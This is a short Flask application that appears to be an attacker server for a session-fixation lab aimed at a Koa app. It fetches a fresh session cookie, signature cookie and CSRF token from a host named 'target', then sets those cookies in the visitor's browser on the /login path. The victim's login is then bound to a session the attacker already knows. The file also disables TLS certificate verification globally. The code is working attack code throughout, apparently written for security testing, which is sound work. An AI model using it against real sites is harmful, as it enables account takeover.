
from flask import Flask, render_template, make_response, redirect, url_for
from bs4 import BeautifulSoup
import requests
import os, ssl

session_cookie_name = 'koa.sess'
session_cookie_sig = 'koa.sess.sig'
csrf_form_id = 'csrf_token'

PROTOCOL = os.environ['PROTOCOL']
if PROTOCOL == 'https':
    ssl._create_default_https_context = ssl._create_unverified_context


app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(12).hex()

values = {}


@app.route('/')
def index():
    return render_template('index.html', values = values)


@app.route('/set_pre_session/')
def pre_session():
    global values

    r = requests.get(f'{PROTOCOL}://target:3000/', verify = False)
    # r = requests.get(f'{PROTOCOL}://localtest.me/', verify = False)
    
    values[session_cookie_name] = r.cookies[session_cookie_name]
    values[session_cookie_sig] = r.cookies[session_cookie_sig]
    values['csrf_token'] = BeautifulSoup(r.text, 'html.parser').find(id=csrf_form_id).attrs['value']

    resp = make_response(redirect(url_for('index')))
    resp.set_cookie(session_cookie_name, values[session_cookie_name], domain='localtest.me', path ='/login')
    resp.set_cookie(session_cookie_sig, values[session_cookie_sig], domain='localtest.me', path ='/login')
    
    return resp


if __name__ == '__main__':
    app.run(host='0.0.0.0')